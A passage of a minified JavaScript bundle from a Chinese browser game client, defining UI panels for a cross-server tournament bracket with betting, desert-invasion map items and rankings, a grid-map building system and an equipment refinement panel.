Object.defineProperty(e,"__esModule",{value:!0}),e.HSSixteenPanel=void 0;var n=i(8),o=i(49),s=i(5),a=i(1),r=i(0),l=i(4),h=i(44),u=i(7),p=i(97),d=i(2),c=i(46),f=i(109),g=i(1001),m=i(1003),v=i(1004),y=i(256),C=i(1006),T=function(t){function e(){var e=t.call(this)||this;return e._sn_="HSSixteenSkin",e.curGroup=1,e.PK_GROUP_1=1,e.PK_GROUP_2=2,e.PK_GROUP_3=3,e.MAX=16,e.playerList=[],e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.ins=c.HegemonyCT.ins(),this.ins.sendBetData(),this.ins.delegate==l.ActorCC.actorID&&(this.curGroup=this.ins.group),this.ins.sendAgainst(this.ins.NO,this.curGroup),this.onChange(),this.addTouchEvent(this,this.onTouch),this.btnList=[],this.btnList[this.PK_GROUP_1]=[],this.btnList[this.PK_GROUP_2]=[],this.btnList[this.PK_GROUP_3]=[];for(var t=1;t<=this.MAX;t++){var e=this["actState_1_"+t],i=this["actState_2_"+t],n=this["actState_3_"+t];e&&(e.name=this.PK_GROUP_1+"_"+t,this.btnList[this.PK_GROUP_1].push(e),e.visible=!1),i&&(i.name=this.PK_GROUP_2+"_"+t,this.btnList[this.PK_GROUP_2].push(i),i.visible=!1),n&&(n.name=this.PK_GROUP_3+"_"+t,this.btnList[this.PK_GROUP_3].push(n),n.visible=!1)}this.finals.touchChildren=!1;for(var o=0,s=this.btnList;o<s.length;o++){var a=s[o];if(a)for(var h=0,u=a;h<u.length;h++){var p=u[h];this.addTouchEvent(p,this.onTouchBtn)}}for(var d=[],f=0,t=1;3>=t;t++)d.push({groupId:t,icon:r.GlobalConfig.LfRaceBase.groupIcon[t]}),t==this.curGroup&&(f=d.length-1);this.eTab.dataProvider=new eui.ArrayCollection(d),this.eTab.selectedIndex=f,this.addChangeEvent(this.eTab,this.onGroupTap)},e.prototype.addDisplay=function(){this.observe(c.HegemonyCT.ins().postAgainst,this.update),this.observe(c.HegemonyCT.ins().postState,this.update),this.observe(c.HegemonyCT.ins().postChampion,this.updateWinner),this.observe(c.HegemonyCT.ins().postServerInfo,this.updateFinals),this.observe(c.HegemonyCT.ins().postBetData,this.refBetState),this.observe(c.HegemonyCT.ins().postOneBetData,this.refBetState),this.update(),this.setTime(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)},e.prototype.setTime=function(){var t="",e="";if(this.ins.state<c.HegemonyStatus.Over){var i=Math.floor((this.ins.openTime-u.GameServerCC.serverTime)/1e3);if(i>0){var o=r.GlobalConfig.LfRaceBase.state[this.ins.state];t=""+o+gettext("倒计时")+"："+n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3),e=""+o+this.setOpenTime(this.ins.openTime)}else if(this.ins.battleEnd){var s=Math.floor((this.ins.nextOpenTime-u.GameServerCC.serverTime)/1e3);if(s>0){var o=r.GlobalConfig.LfRaceBase.state[this.ins.state+1];t=""+o+gettext("倒计时")+"："+n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3),e=""+o+this.setOpenTime(this.ins.nextOpenTime)}}else t=""+r.GlobalConfig.LfRaceBase.state[this.ins.state]+gettext("进行中")}else Timer.stop(this.setTime,this);this.times.text=t,this.openTime.text=e},e.prototype.setOpenTime=function(t){var e=new Date(t),i=e.getMonth()+1,n=e.getDate(),o=e.getHours(),s=e.getMinutes();return gettext("将于{0}月{1}日 {2}:{3}开始",i,n,o,s?s:"00")},e.prototype.updateWinner=function(){if(this.ins.championNO==this.ins.NO&&this.ins.championGroup==this.curGroup&&this.ins.curServerId&&this.ins.championPlayer){var t=[];t.push(this.ins.curServerId),this.ins.sendServerId(this.ins.NO,t)}},e.prototype.updateFinals=function(){this.ins.championServerId&&this.ins.championServerId==this.ins.roleServer&&this.ins.championNO==this.ins.NO&&this.ins.championGroup==this.curGroup?(this.finals.visible=!0,this.schedule.visible=this.scheduleBg.visible=!1,this.headImg.source="yuanhead"+this.ins.roleJob+this.ins.roleSex,this.nameTxt.text="S."+this.ins.roleServer+"\n"+this.ins.roleName):(this.finals.visible=!1,this.schedule.visible=this.scheduleBg.visible=!0,this.schedule.source=r.GlobalConfig.LfRaceBase.stateImg[this.ins.state])},e.prototype.removeDisplay=function(){Timer.stop(this.setTime,this)},e.prototype.update=function(){this.ins.isChange&&(this.ins.isChange=!1,f.HegemonyRedPoint.ins().postRedPoint());var t=this.ins.againstInfo[this.ins.NO];if(t&&t[this.curGroup]){this.clearLink();for(var e in t[this.curGroup]){var i=t[this.curGroup][e].index,n=t[this.curGroup][e].server1,a=t[this.curGroup][e].server2,l=t[this.curGroup][e].winServer,h=t[this.curGroup][e].name1,u=t[this.curGroup][e].name2,d=r.GlobalConfig.LfRaceBase.nameColor;n&&this["player_"+i+"_1"]&&(this["player_"+i+"_1"].textFlow=s.TextFlowMaker.generateTextFlow1("S."+n+"\n|C:"+d+"&T:"+h+"|"),this["player_"+i+"_1"].filters=l&&n!=l?o.FilterUtil.ARRAY_GRAY_FILTER:null,this["player_"+i+"_1"].name=t[this.curGroup][e].player1+"_"+t[this.curGroup][e].curServer1,this.playerList.push(this["player_"+i+"_1"])),a&&this["player_"+i+"_2"]&&(this["player_"+i+"_2"].textFlow=s.TextFlowMaker.generateTextFlow1("S."+a+"\n|C:"+d+"&T:"+u+"|"),this["player_"+i+"_2"].filters=l&&a!=l?o.FilterUtil.ARRAY_GRAY_FILTER:null,this["player_"+i+"_2"].name=t[this.curGroup][e].player2+"_"+t[this.curGroup][e].curServer2,this.playerList.push(this["player_"+i+"_2"])),l&&n==l?p.PeakedHelp.setImgGroupSource(this["link_"+i+"_1"],"line_light"):l&&a==l&&p.PeakedHelp.setImgGroupSource(this["link_"+i+"_2"],"line_light")}this.updateFinals(),this.refBetState()}},e.prototype.clearLink=function(){for(var t=0;t<this.MAX;t++)this["link_"+t+"_1"]&&p.PeakedHelp.setImgGroupSource(this["link_"+t+"_1"],"line_black"),this["link_"+t+"_2"]&&p.PeakedHelp.setImgGroupSource(this["link_"+t+"_2"],"line_black"),this["player_"+t+"_1"]&&this["player_"+t+"_1"].text&&(this["player_"+t+"_1"].text=""),this["player_"+t+"_2"]&&this["player_"+t+"_2"].text&&(this["player_"+t+"_2"].text=""),this["btnImg"+t].source="wjzb_battleBg_"+this.curGroup},e.prototype.refBetState=function(){this.vewChampScore.visible=this.ins.state>c.HegemonyStatus.Prom4;var t=this.getAgainstData(4,1);this.ins.state==c.HegemonyStatus.Finals?t&&t.server1&&t.server2?t.winServer?this.vewChampScore.textFlow=s.TextFlowMaker.generateTextFlow1("|U:&T:"+gettext("查看比分")):this.checkIsBet(this.curGroup,t.id)?this.vewChampScore.textFlow=s.TextFlowMaker.generateTextFlow1("|U:&T:"+gettext("已下注")):(this.vewChampScore.visible=!!this.openTime.text,this.vewChampScore.textFlow=s.TextFlowMaker.generateTextFlow1("|U:&T:"+gettext("决赛下注"))):this.vewChampScore.visible=!1:(t&&t.server1&&t.server2||(this.vewChampScore.visible=!1),this.vewChampScore.textFlow=s.TextFlowMaker.generateTextFlow1("|U:&T:"+gettext("查看比分")));for(var e in this.btnList)for(var i=this.ins.state>c.HegemonyStatus.Knockout&&this.ins.state<c.HegemonyStatus.Over,n=0,o=this.btnList[e];n<o.length;n++){var a=o[n];if(a){var r=a.name.split("_");a.visible=this.ins.state>c.HegemonyStatus.Knockout&&this.ins.state>=+r[0]+4;var l=this.getAgainstData(+r[0],+r[1]);i?l&&l.server1&&l.server2?l.winServer?a.currentState="view":this.checkIsBet(this.curGroup,l.id)?a.currentState="beted":(a.visible=!!this.openTime.text&&1==this.ins.betState[this.curGroup],a.currentState="bet"):a.visible=!1:(l&&l.server1&&l.server2||(a.visible=!1),a.currentState="view")}}},e.prototype.onTouchBtn=function(t){var e=t.target.parent,i=e.name,n=i.split("_"),o=this.getAgainstData(+n[0],+n[1]);switch(e.currentState){case"view":c.HegemonyCT.ins().sendWarData(c.HegemonyCT.ins().NO,this.curGroup,o.id),win.open(y.HSWarReportWin);break;case"bet":var s=c.HegemonyCT.ins().betState[this.curGroup];if(2==s)return void d.TipsCT.ins().showTips(gettext("您已下注"));if(3==s)return void d.TipsCT.ins().showTips(gettext("下注时间已结束"));if(!s)return void d.TipsCT.ins().showTips(gettext("未到下注时间"));win.open(m.HSBetWin,this.curGroup,o.id,o.server1,o.server2);break;case"beted":}},e.prototype.getAgainstData=function(t,e){var i=1;this.btnList[t]&&(i=this.btnList[t].length+(e?e-1:0));var n=this.ins.againstInfo[this.ins.NO];if(n&&n[this.curGroup])for(var o in n[this.curGroup])if(n[this.curGroup][o].index==i)return n[this.curGroup][o]},e.prototype.checkIsBet=function(t,e){for(var i in this.ins.betData)if(this.ins.betData[i].group==t&&this.ins.betData[i].id==e)return!0;return!1},e.prototype.onTouch=function(t){if(t.target.name){var e=t.target.name.split("_");return void h.ReadPlayerCT.ins().sendFindPlayer(+e[0],+e[1])}switch(t.target){case this.outBtn:c.HegemonyCT.ins().sendKnockoutReport(1),win.open(g.HOutRecordWin);break;case this.groupBtn:c.HegemonyCT.ins().sendPlayerInfo(1),win.open(C.HSixteenRecordWin);break;case this.betBtn:c.HegemonyCT.ins().sendBetData(),win.open(v.HSMyBetWin);break;case this.vewChampScore:var i=this.getAgainstData(4,1);if(this.vewChampScore.text==gettext("查看比分"))c.HegemonyCT.ins().sendWarData(c.HegemonyCT.ins().NO,this.curGroup,i.id),win.open(y.HSWarReportWin);else if(this.vewChampScore.text==gettext("决赛下注")){var n=c.HegemonyCT.ins().betState[this.curGroup];if(3==n)return void d.TipsCT.ins().showTips(gettext("下注时间已结束"));if(!n)return void d.TipsCT.ins().showTips(gettext("未到下注时间"));win.open(m.HSBetWin,this.curGroup,i.id,i.server1,i.server2)}}},e.prototype.onGroupTap=function(){this.curGroup=this.eTab.selectedItem.groupId,this.onChange()},e.prototype.onChange=function(){this.ins.state>c.HegemonyStatus.Prom4&&this.ins.sendChampionInfo(this.ins.NO,this.curGroup),this.ins.sendAgainst(this.ins.NO,this.curGroup),this.updateFinals()},__decorate([delayCall(300)],e.prototype,"updateFinals",null),e}(a.BaseView);e.HSSixteenPanel=T,window.HSSixteenPanel=T,__reflect(T.prototype,"HSSixteenPanel",[]),window.HSSixteenPanel=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeItem=void 0;var n=i(3),o=i(0),s=i(82),a=i(1033),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="Invadeitemskin",e.imgUrls=["Huangmo_gray","Huangmo_green","Huangmo_red","Huangmo_gray"],e.imgQuaUrls=["","Huangmo_gold","Huangmo_silver","Huangmo_bronze"],e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){var t=o.GlobalConfig.DesertInvasionNodeConfig[this._info.id];this.scaleX=t.localsize*window.hmscale,this.scaleY=t.localsize,this.mapname.text=null===t||void 0===t?void 0:t.fbname,this.icon.source=this.imgQuaUrls[t.type];for(var e=1;3>=e;e++){var i=this._info.winsArr[e-1];this["point"+e].source=this.imgUrls[i]}this.updateRed()}},e.prototype.onClick=function(t){win.open(a.InvadeBossWin,this._info),s.InvadeCT.ins().invadeTeamDatas.length&&s.InvadeCT.ins().sendTeamInfo(),s.InvadeCT.ins().sendGetInvadeBase(this._info.id)},e.prototype.updateRed=function(){this.eRp.visible=!1},e}(n.BaseItemRender);e.InvadeItem=r,window.InvadeItem=r,__reflect(r.prototype,"InvadeItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeRankAwardItem=void 0;var n=i(3),o=i(77),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=o.ItemBaseNoName,this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){var t=this._info.rankIdx,e=this._info.rankIdx2;t==e?(this.rankGrp1.visible=!0,this.rankGrp2.visible=!1,this.rank0.text=t.toString()):(this.rankGrp1.visible=!1,this.rankGrp2.visible=!0,this.rank1.text=t.toString(),this.rank2.text=e.toString()),this.rewardList.dataProvider=new eui.ArrayCollection(this._info.award)}},e}(n.BaseItemRender);e.InvadeRankAwardItem=s,window.InvadeRankAwardItem=s,__reflect(s.prototype,"InvadeRankAwardItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeRankItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this._info=this.data,this.skin&&this._info&&(this.rank.text=gettext("第{0}名",this._info.pos),this.nameLabel.text="S."+this._info.serverId,this.nameLabel0.text=this._info.player,this.point.text=this._info.score.toString())},e}(n.BaseItemRender);e.InvadeRankItem=o,window.InvadeRankItem=o,__reflect(o.prototype,"InvadeRankItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemLadderRewardTipRender=void 0;var n=i(3),o=i(11),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward.itemRenderer=o.ItemBase,this.lstReward.touchEnabled=!1},e.prototype.dataChanged=function(){this.show.text=this.data.show,this.lstReward.dataProvider=new eui.ArrayCollection(this.data.rewards)},e}(n.BaseItemRender);e.ItemLadderRewardTipRender=s,window.ItemLadderRewardTipRender=s,__reflect(s.prototype,"ItemLadderRewardTipRender",[]),window.ItemLadderRewardTipRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingBuffItem=void 0;var n=i(5),o=i(3),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingBuffItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data,e=s.GlobalConfig.LingJingBenefitConfig[t];e&&(this.txtName.text=e.title,this.txtDesc.textFlow=n.TextFlowMaker.generateTextFlow1(e.desc))}},e}(o.BaseItemRender);e.LingJingBuffItem=a,window.LingJingBuffItem=a,__reflect(a.prototype,"LingJingBuffItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingItem=void 0;var n=i(3),o=i(117),s=i(1050),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingItemSkin",e.preState=-1,e.isInit=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this,this.onTap)},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.curLingJingId=this.data,this.updateView())},e.prototype.updateView=function(){if(this.skin&&this.data){this.txtPos.visible=!1;var t=o.LingJingCT.ins().getGridInfo(this.data.x,this.data.y);if(t){var e=t.state;window.mapopen&&e!=1&&(e=0),(window.setitemGrp(this.itemGrp,this.data)),this.itemGrp.visible=e>-1,t.isNearGrid()?(this.imgSel.visible=!0,this.imgSel.source="lingjing_unit2"):t.isAltarGrid()?(this.imgSel.visible=!0,this.imgSel.source="lingjing_unit3"):this.imgSel.visible=!1,this.on.source=t.isPlayerGrid()?"lingjing_char":"lingjing_unit1",this.off.visible=-1==e||2==e,this.on.visible=!this.off.visible,0!=e&&1!=e||!t.cfg||0!=t.isLockGrid()?this.icon.source="":1==e?this.icon.source=t.cfg.icon:this.icon.source=t.cfg.icon+"1",-1==this.preState&&e>-1&&this.isInit&&(this.playAni(),this.preState=e)}else this.off.visible=!0,this.on.visible=!1,this.imgSel.visible=!1;this.isInit=!0}},e.prototype.playAni=function(){this.itemGrp.scaleX=this.itemGrp.scaleY=0;var t=egret.Tween.get(this.itemGrp);t.to({scaleX:1,scaleY:1},1500,egret.Ease.getElasticOut(1,.8))},e.prototype.onTap=function(){if(this.skin&&this.data){var t=o.LingJingCT.ins().getGridInfo(this.data.x,this.data.y);if(t&&t.isNearGrid())if(1!=t.state&&t.cfg&&0==t.isLockGrid())win.open(s.LingJingWildWindow,t);else{var e=win.get("LingJingMainPanel");e&&e.movePlayerToGrid(this.data.x,this.data.y)}}},e}(n.BaseItemRender);e.LingJingItem=a,window.LingJingItem=a,__reflect(a.prototype,"LingJingItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingBuildItem=void 0;var n=i(8),o=i(3),s=i(0),a=i(7),r=i(2),l=i(117),h=i(437),u=function(t){function e(){var e=t.call(this)||this;return e.buildType=0,e.leftTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.costCmlist.itemRenderer=h.LingJingCostItem,this.costCmlist.dataProvider=this.costArc=new eui.ArrayCollection([]),this.dataChanged(),this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){this.skin&&this.data&&this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.data){var t=s.GlobalConfig.LingJingBuildConfig[this.data.id];t&&(this.UpgradeTime.text="",this.buildType=t.type,this.buildingname.text=t.name,this.desc.text=t.desc,this.desc2.text=t.desc2,this.buildinglevel.text="Lv."+(t.id%1e3+1),this.imgBuild.source=t.icon,this.costArc.replaceAll(t.cost),this.btnUpLv.visible=t.cost&&t.cost.length>0,this.leftTime=Math.floor(.001*(this.data.times-a.GameServerCC.serverTime)),this.leftTime>0&&!Timer.has(this.flusLeftTime,this)&&(this.leftTime+=3,this.btnUpLv.enabled=!1,this.btnUpLv.label=gettext("升级中"),Timer.start(1e3,-1,this.flusLeftTime,this),this.flusLeftTime()))}},e.prototype.onClick=function(t){switch(t.target){case this.btnUpLv:this.checkMaterialCost()&&l.LingJingCT.ins().sendLingJingBuildLvUp(this.buildType)}},e.prototype.checkMaterialCost=function(){var t=s.GlobalConfig.LingJingBuildConfig[this.data.id];if(!t)return!1;for(var e=0,i=t.cost;e<i.length;e++){var n=i[e];if(l.LingJingCT.ins().getMaterialNum(n.type)<n.count){var o=l.LingJingCT.ins().getMaterialCfgByType(n.type);return r.TipsCT.ins().showTips(gettext("|C:{0}&T:{1}|不足",15119394,o?o.name:"")),!1}}return!0},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?(this.UpgradeTime.text="",Timer.stopAll(this),this.btnUpLv.enabled=!0,this.btnUpLv.label=gettext("升级")):this.UpgradeTime.text=gettext("正在升级：{0}",n.DateUtils.getFormatBySecond(this.leftTime,n.DateUtils.TIME_FORMAT_1))},e}(o.BaseItemRender);e.LingJingBuildItem=u,window.LingJingBuildItem=u,__reflect(u.prototype,"LingJingBuildItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingCostItem=void 0;var n=i(3),o=i(117),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="CostComSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.data){var t=o.LingJingCT.ins().getMaterialCfgByType(this.data.type);this.icon.source=t.icon,this.countLabel.text=this.data.count}},e}(n.BaseItemRender);e.LingJingCostItem=s,window.LingJingCostItem=s,__reflect(s.prototype,"LingJingCostItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRankItem=void 0;var n=i(8),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){this.rank.text=gettext("第{0}名",this._info.pos),this.nameLabel.text="S."+this._info.serverId,this.nameLabel0.text=this._info.player;var t=n.DateUtils.getFormatBySecond(this._info.times,n.DateUtils.TIME_FORMAT_1);t=t.slice(0,-3),this.point.text=t}},e}(o.BaseItemRender);e.LingJingRankItem=s,window.LingJingRankItem=s,__reflect(s.prototype,"LingJingRankItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRewardItem=void 0;var n=i(3),o=i(77),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=o.ItemBaseNoName,this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this.data){var t=this.data[0],e=this.data[this.data.length-1];t.rank==e.rank?(this.rankGrp1.visible=!0,this.rankGrp2.visible=!1,this.rank0.text=t.rank.toString()):(this.rankGrp1.visible=!1,this.rankGrp2.visible=!0,this.rank1.text=t.rank.toString(),this.rank2.text=e.rank.toString()),this.rewardList.dataProvider=new eui.ArrayCollection(t.award)}},e}(n.BaseItemRender);e.LingJingRewardItem=s,window.LingJingRewardItem=s,__reflect(s.prototype,"LingJingRewardItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasBreakPanel=void 0;var n=i(21),o=i(16),s=i(19),a=i(1),r=i(22),l=i(295),h=i(110),u=i(0),p=i(13),d=i(69),c=i(2),f=i(133),g=function(t){function e(){var e=t.call(this)||this;return e._sn_="LongGasBreakSkin",e.isCan=!1,e}return __extends(e,t),e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve(),l.TimerManager.ins().remove(this.timeClock,this),o.DisplayUtils.removeFromParent(this.upLvEff),o.DisplayUtils.removeFromParent(this.finisheff);for(var t=0;t<this.effs.length;t++)o.DisplayUtils.removeFromParent(this.effs[t])}},e.prototype.skinComplete=function(){this.costCmlist.itemRenderer=h.CostComRender,this._curCostArr=new eui.ArrayCollection,this.costCmlist.dataProvider=this._curCostArr,this.costCmlist0.itemRenderer=h.CostComRender,this._curCostArr0=new eui.ArrayCollection,this.costCmlist0.dataProvider=this._curCostArr0,this.costCmlist1.itemRenderer=h.CostComRender,this._curCostArr1=new eui.ArrayCollection,this.costCmlist1.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.btnjihuo,this.onClick),this.addTouchEvent(this.btntupo,this.onClick),this.addTouchEvent(this.btnlianhua,this.onClick),this.observe(f.LongGasCT.ins().updateGETUPTOP,this.callback),this.tipsType=t[0],this.roleId=t[1],this.slot=t[2],this.effs=[],this.flys=[],this.update()},e.prototype.callback=function(){this.calldesc==e.JIHUO?(this.star.visible=!0,this.tipsType=e.SHENGJI,this.callbackToUpdate()):this.calldesc==e.SHENGJI?this.playUpLvEff():this.calldesc==e.TUPO&&this.playflyEff()},e.prototype.callbackToUpdate=function(){var t=(p.SubRoles.ins().getSubRoleByIndex(this.roleId),f.LongGasCT.ins().getSlotByInfo(this.slot));t.assault?this.tipsType=e.TUPO:this.calldesc==e.TUPO&&(this.btntupo.touchEnabled=!0,this.tipsType=e.SHENGJI),this.update()},e.prototype.update=function(){var t=u.GlobalConfig.LoongGasPosCfg[this.slot];if(t){if(this.tipsType==e.JIHUO){if(this.title.text=gettext("激活"),this.star.visible=!1,this.jihuo.visible=!0,this.tupo.visible=!1,this.lianhua.visible=!1,this.itemicon.source=t[0].icon+"",this.name1.text=t[0].name,this.itemicon.validateNow(),t[1].attr){var i=r.AttributeData.getAttrStrByTypeTotem(t[1].attr[0].type);this.jhattr0.text=i+"+"+t[1].attr[0].value,this.jhattr1.visible=!0,t[1].attr[1]?(i=r.AttributeData.getAttrStrByTypeTotem(t[1].attr[1].type),this.jhattr1.text=i+"+"+t[1].attr[1].value):this.jhattr1.visible=!1}var n=[];for(var o in t[0].cost)n.push({cost:{type:t[0].cost[o].type,id:t[0].cost[o].id,count:t[0].cost[o].count},isShowHas:!0,isShowXh:!1});this._curCostArr0.replaceAll(n)}else if(this.tipsType==e.TUPO){this.title.text=gettext("突破"),this.star.visible=!0;var s=(p.SubRoles.ins().getSubRoleByIndex(this.roleId),f.LongGasCT.ins().getSlotByInfo(this.slot));if(this.jihuo.visible=!1,this.tupo.visible=!0,this.lianhua.visible=!1,this.itemicon.source=t[0].icon+"",this.name3.text=t[0].name,this.itemicon.validateNow(),this.tpattr1.text=s.showlv+"",this.tpattr2.text=s.assault+"",this.tpright0.x=this.tpattr1.x+this.tpattr1.width,this.tpattr2.x=this.tpright0.x+this.tpright0.width,s.attr){this.tpattr0.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[0].type),this.tpattr3.text=s.attr[0].value+"";var a=u.GlobalConfig.LoongGasPosCfg[s.id][s.level+1];this.tpattr4.text=a.attr[0].value+"",this.tpright1.x=this.tpattr3.x+this.tpattr3.width,this.tpattr4.x=this.tpright1.x+this.tpright1.width,s.attr[1]&&a.attr[1]?(this.g2.visible=!0,this.tpattr5.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[1].type),this.tpattr6.text=s.attr[1].value+"",this.tpattr7.text=a.attr[1].value+"",this.tpright2.x=this.tpattr6.x+this.tpattr6.width,this.tpattr7.x=this.tpright2.x+this.tpright2.width):this.g2.visible=!1}var n=[];for(var o in s.cost)n.push({cost:{type:s.cost[o].type,id:s.cost[o].id,count:s.cost[o].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.replaceAll(n)}else if(this.tipsType==e.SHENGJI){this.title.text=gettext("炼化"),this.star.visible=!0,this.lianhua.visible=!0,this.jihuo.visible=!1,this.tupo.visible=!1;var s=(p.SubRoles.ins().getSubRoleByIndex(this.roleId),f.LongGasCT.ins().getSlotByInfo(this.slot)),l=u.GlobalConfig.LoongGasPosCfg[s.id][0],a=u.GlobalConfig.LoongGasPosCfg[s.id][s.level+1];if(this.costLabel.visible=!0,!a)return this.costLabel.visible=!1,this.btnlianhua.visible=!1,this.lhright1.visible=!1,this.lhright0.visible=!1,this.lhattr4.visible=!1,this.lhattr6.visible=!1,this.maxdesc0.visible=!0,this.lhright2.visible=!1,this.lhattr8.visible=!1,s.attr&&(this.lhattr3.text=s.showlv+"",this.lhattr1.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[0].type),this.lhattr5.text=s.attr[0].value+"",s.attr[1]?(this.attr2.visible=!0,this.lhattr2.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[1].type),this.lhattr7.text=s.attr[1].value+""):this.attr2.visible=!1),this.name2.text=l.name,this.itemicon.source=l.icon+"",this.updateEff(),void this.addCheckEff();if(this.itemicon.source=l.icon+"",this.name2.text=l.name,s.attr){this.lhattr3.text=s.showlv+"",this.lhattr4.text=a.showlv+"",this.lhright1.x=this.lhattr3.x+this.lhattr3.width+this.lhright1.width,this.lhattr4.x=this.lhright1.x,this.lhattr1.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[0].type),this.lhattr5.text=s.attr[0].value+"",this.lhattr6.text=a.attr[0].value+"",this.lhright0.x=this.lhattr5.x+this.lhattr5.width+this.lhright0.width,this.lhattr6.x=this.lhright0.x,s.attr[1]&&a.attr[1]?(this.attr2.visible=!0,this.lhattr2.text=r.AttributeData.getAttrStrByTypeTotem(s.attr[1].type),this.lhattr7.text=s.attr[1].value+"",this.lhattr8.text=a.attr[1].value+"",this.lhright2.x=this.lhattr7.x+this.lhattr7.width+this.lhright2.width,this.lhattr8.x=this.lhright2.x):this.attr2.visible=!1;var n=[];for(var o in s.cost)n.push({cost:{type:s.cost[o].type,id:s.cost[o].id,count:s.cost[o].count},isShowHas:!0,isShowXh:!1});this._curCostArr.replaceAll(n)}}this.updateEff(),this.addCheckEff()}},e.prototype.updateEff=function(){if(this.star.visible){var t=(p.SubRoles.ins().getSubRoleByIndex(this.roleId),f.LongGasCT.ins().getSlotByInfo(this.slot));if(!t)return void c.TipsCT.ins().showTips(gettext("显示异常"));if(this.cirimg.visible=!0,!t.level){for(var i=0;i<e.maxCir;i++)this["s"+i].visible=!1;return void(this.cirimg.visible=!1)}if(this.maxdesc0.visible||this.tipsType==e.TUPO){for(var i=0;i<e.maxCir;i++)this["s"+i].visible=!0;return void o.DisplayUtils.drawCir(this._shap,this.star.width>>1,360)}for(var n=t.level%10,i=0;i<e.maxCir;i++)n?this["s"+i].visible=n>i:this["s"+i].visible=!1,this._shap||(this._shap=new egret.Shape),this._shap.parent||(this.star.addChild(this._shap),this.cirimg.mask=this._shap,this._shap.x=this._shap.y=this.star.width>>1,this._shap.rotation=-90),i>0&&n>0?o.DisplayUtils.drawCir(this._shap,this.star.width>>1,360*(n-1)/e.maxCir):this._shap.graphics.clear()}},e.prototype.addCheckEff=function(){for(var t=0;t<e.maxCir;t++)if(this["s"+t].visible){if(!this.effs[t]){var i=new n.MovieClip;this.effs[t]=i}this.effs[t].parent||this["star"+t].addChild(this.effs[t]),this.effs[t].x=18,this.effs[t].y=20,this.effs[t].scaleX=this.effs[t].scaleY=1.1,this.effs[t].playFile(RES_DIR_EFF+"pulse2",-1)}else this.effs[t]&&this.effs[t].parent&&o.DisplayUtils.removeFromParent(this.effs[t])},e.prototype.playUpLvEff=function(){this.upLvEff||(this.upLvEff=new n.MovieClip),this.upLvEff.parent||this.star.addChild(this.upLvEff),this.upLvEff.x=145,this.upLvEff.y=140;var t=this;this.upLvEff.playFile(RES_DIR_EFF+"UpEff1",1,function(){o.DisplayUtils.removeFromParent(t.upLvEff)}),t.callbackToUpdate()},e.prototype.playflyEff=function(){for(var t=this,e=function(e){if(i.effs[e]&&i.effs[e].parent){i.flys[e]=!0;var 